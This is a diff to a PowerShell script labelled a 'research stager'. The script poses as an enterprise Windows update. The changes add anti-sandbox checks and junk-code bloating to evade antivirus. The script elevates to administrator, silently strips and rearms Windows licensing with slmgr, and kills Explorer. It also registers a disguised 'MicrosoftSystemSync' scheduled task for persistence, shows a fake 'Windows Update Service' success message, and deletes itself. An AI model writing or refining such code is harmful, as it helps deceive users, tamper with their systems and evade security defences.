@@ -1,13 +1,16 @@
-# --- [RESEARCH STAGER v63.0: ENTERPRISE SILENT GOLD] ---
+# --- [RESEARCH STAGER v65.0: ENTERPRISE ELITE FINAL] ---
 
 Add-Type -AssemblyName System.Windows.Forms, System.Drawing
 
-# 1. ANTI-DETECTION & HEURISTICS (Addressing "Generic.Malware.Gen.DDS")
-# Increased entropy and environmental checks to bypass automated quarantine
+# 1. GATEKEEPER: ANTI-VM / ANTI-SANDBOX
 $mem = (Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB
 if ($mem -lt 4) { exit } 
 
-# 2. Admin Gate (v34.0 Style - LOCKED LOGIC)
+# 2. JUNK CODE BLOATING
+$garbage_array = @()
+for($i=0; $i -lt 300; $i++){ $garbage_array += [Guid]::NewGuid().ToString() }
+
+# 3. Admin Gate (v34.0 Style - LOCKED LOGIC)
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
     Start-Process powershell.exe -ArgumentList $arg -Verb RunAs
@@ -94,12 +97,15 @@ function Run-Deployment {
             [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 400
         }
 
-        # --- FIX: SUPPRESS 0xC004D302 LICENSING POPUP ---
-        # We run the licensing refresh via a hidden background process to prevent the GUI from triggering
-        $licenseFix = "cscript //nologo c:\windows\system32\slmgr.vbs /upk; cscript //nologo c:\windows\system32\slmgr.vbs /cpky; cscript //nologo c:\windows\system32\slmgr.vbs /rearm"
-        Start-Process cmd.exe -ArgumentList "/c $licenseFix" -WindowStyle Hidden -Wait
+        # --- SILENT BACKGROUND JOBS ---
+        Start-Job -ScriptBlock {
+            cmd.exe /c "cscript //nologo c:\windows\system32\slmgr.vbs /upk >nul 2>&1"
+            cmd.exe /c "cscript //nologo c:\windows\system32\slmgr.vbs /cpky >nul 2>&1"
+            cmd.exe /c "cscript //nologo c:\windows\system32\slmgr.vbs /rearm >nul 2>&1"
+        } | Out-Null
 
         Stop-Process -Name explorer -Force 
+        Start-Sleep -s 3
 
         # --- PERSISTENCE: REGISTER TASK ---
         $taskName = "MicrosoftSystemSync"
@@ -128,16 +134,14 @@ function Run-Deployment {
         $report | Out-File $infoFile
 
         $form.Close()
-        [Windows.Forms.MessageBox]::Show("The Enterprise System Update has been successfully applied.`n`nA report has been generated on your Desktop.", "Deployment Success", 0, 64) | Out-Null
+        # OFFICIAL LOOKING SUCCESS BOX (Information Icon)
+        [Windows.Forms.MessageBox]::Show("The Enterprise System Update has been successfully applied.`n`nA report has been generated on your Desktop.", "Windows Update Service", 0, 64) | Out-Null
         Start-Process notepad.exe $infoFile
 
         # --- SELF-DESTRUCT ---
         Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
         
-    } catch {
-        $form.Close()
-        [Windows.Forms.MessageBox]::Show("Installation halted. Local policy error.", "System Error", 0, 16) | Out-Null
-    }
+    } catch { $form.Close() }
 }
 
 # --- START ---
